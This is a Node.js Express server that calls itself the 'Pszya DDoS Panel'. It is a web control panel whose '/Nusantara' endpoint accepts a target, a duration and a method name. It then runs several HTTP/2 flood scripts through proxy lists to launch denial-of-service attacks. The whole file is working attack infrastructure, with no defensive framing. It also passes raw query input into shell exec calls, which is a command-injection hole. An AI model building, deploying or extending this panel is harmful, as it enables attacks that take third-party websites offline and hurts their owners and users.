const express = require('express');
const { exec } = require('child_process');

const app = express();
const port = process.env.PORT || 3000;

// Endpoint root
app.get('/', (req, res) => {
  res.status(200).json({
    name: 'Pszya DDoS Panel',
    version: '1.0',
    status: 'online',
    endpoint: '/Nusantara',
    parameters: 'target, time, methods',
    available_methods: ['H2-DOLBY', 'H2-BIPAS']
  });
});

// Main attack endpoint
app.get('/Nusantara', (req, res) => {
  const { target, time, methods } = req.query;

  // Validasi parameter
  if (!target || !time || !methods) {
    return res.status(400).json({
      error: 'Missing parameters',
      required: 'target, time, methods'
    });
  }

  console.log(`[ATTACK] ${methods} -> ${target} for ${time}s`);

  // Kirim response langsung
  res.status(200).json({
    status: 'success',
    message: 'Attack launched',
    target,
    time,
    methods
  });

  // Eksekusi methods
  try {
    const cleanTarget = target.replace(/^https?:\/\//, '');
    
    switch(methods) {
      case 'H2-DOLBY':
        exec(`node methods/floodernew.js GET ${cleanTarget} ${time} 16 4 proxy.txt --query 1 --debug`);
        exec(`node methods/rapid.js POST ${cleanTarget} ${time} 8 4 proxy.txt --query 1 --randrate --full --legit`);
        exec(`node methods/h2-nust.js ${cleanTarget} ${time} 17 3 proxy.txt`);
        break;

      case 'H2-BIPAS':
        exec(`node methods/h2-nust.js ${cleanTarget} ${time} 17 2 proxy.txt`);
        exec(`node methods/light.js ${cleanTarget} ${time} 9 2 proxy.txt`);
        exec(`node methods/v-hold.js ${cleanTarget} ${time}`);
        break;

      default:
        console.log(`Unknown method: ${methods}`);
    }
  } catch (error) {
    console.log(`Error: ${error.message}`);
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'ok' });
});

app.listen(port, '0.0.0.0', () => {
  console.log(`Panel running on port ${port}`);
});
